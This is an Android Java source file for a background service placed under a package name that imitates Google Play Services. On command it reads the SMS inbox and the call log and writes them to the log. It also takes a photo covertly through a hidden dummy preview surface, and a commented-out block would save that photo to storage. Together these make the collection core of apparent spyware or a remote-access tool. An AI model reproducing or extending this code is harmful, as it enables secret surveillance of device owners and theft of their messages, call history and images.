package com.google.androidgms;

import android.app.IntentService;
import android.content.Intent;
import android.content.Context;
import android.database.Cursor;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.widget.Toast;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import static android.support.v4.app.ActivityCompat.startActivityForResult;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p/>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class GetData extends IntentService {
    public static final String Msg="bleh";

    Camera cam;
    Camera.Parameters param;



    public GetData() {
        super("GetData");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent.getStringExtra(Msg).equals("sms")) {
            Log.d(intent.getStringExtra(Msg), "print");
            String[] reqCols = new String[] { "_id", "address", "body","person" };
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), reqCols, null, null, null);
            cursor.moveToFirst();

            do{
                String msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                }
                Log.d("Message",msgData);
            }while(cursor.moveToNext());
        }
        else if(intent.getStringExtra(Msg).equals("logs")){
            Cursor c1 = getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,null);
            if(c1!=null){
                while(c1.moveToNext()){
                    String number = c1.getString(c1.getColumnIndex("number"));
                    String name = c1.getString(c1.getColumnIndex("name"));
                    long date = c1.getLong(c1.getColumnIndex("date"));
                    long duration=c1.getLong(c1.getColumnIndex("duration"));
                    Log.d("entry:",number+","+name+","+date+","+duration);
                }
            }
        }
        else if(intent.getStringExtra(Msg).equals("camera")){
            System.out.println( "Preparing to take photo");
            Camera camera = null;
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            Camera.getCameraInfo(0, cameraInfo);

                try {
                    camera = Camera.open(0);
                } catch (RuntimeException e) {
                    System.out.println("Camera not available");
                    camera = null;
                    //e.printStackTrace();
                }
                try{
                    if (null == camera) {
                        System.out.println("Could not get camera instance");
                    }else{
                        System.out.println("Got the camera, creating the dummy surface texture");
                        //SurfaceTexture dummySurfaceTextureF = new SurfaceTexture(0);
                        try {
                            //camera.setPreviewTexture(dummySurfaceTextureF);
                            camera.setPreviewTexture(new SurfaceTexture(0));
                            camera.startPreview();
                        } catch (Exception e) {
                            System.out.println("Could not set the surface preview texture");
                            e.printStackTrace();
                        }
                        camera.takePicture(null, null, new Camera.PictureCallback() {

                            @Override
                            public void onPictureTaken(byte[] data, Camera camera) {
                                Log.i("CAMERA","reached callback");
                                camera.release();
                            }
                        });
                    }
                }catch (Exception e){
                    camera.release();
                }




        }
    }

}

//class PhotoTask extends AsyncTask<Void,Void,Void>{
//    Camera mCamera;
//    public PhotoTask(){
//        mCamera.setPreviewDisplay();
//        mCamera=Camera.open();
//        mCamera.startPreview();
//
//    }
//
//    @Override
//    protected Void doInBackground(Void... voids) {
//        Log.i("Async","It is here");
//        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
//        if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
//            startActivityForResult(takePictureIntent, REQUEST_IMAGE_CAPTURE);
//        }
//        return null;
//    }
//
//    @Override
//    protected void onPostExecute(Void aVoid) {
//        super.onPostExecute(aVoid);
//    }
//
//    private Camera.PictureCallback mPictureCallback = new Camera.PictureCallback() {
//
//        @Override
//        public void onPictureTaken(byte[] data, Camera camera) {
//            File file = null;
//
//            // Check whether the media is mounted with read/write permission.
//            if (Environment.MEDIA_MOUNTED.equals(
//                    Environment.getExternalStorageState())) {
//                file = new File("/sdcard/","Yay.jpg");
//            }
//
//            if (file == null) {
//                Log.d("CAMERA", "Error creating media file, check storage persmissions!");
//                return;
//            }
//
//            try {
//                FileOutputStream fileOutputStream = new FileOutputStream(file);
//                fileOutputStream.write(data);
//                fileOutputStream.close();
//            } catch (FileNotFoundException e) {
//                Log.d("CAMERA", "File not found: " + e.getMessage());
//            } catch (IOException e) {
//                Log.d("CAMERA", "Error accessing file: " + e.getMessage());
//            }
//            camera.release();
//        }
//    };
//}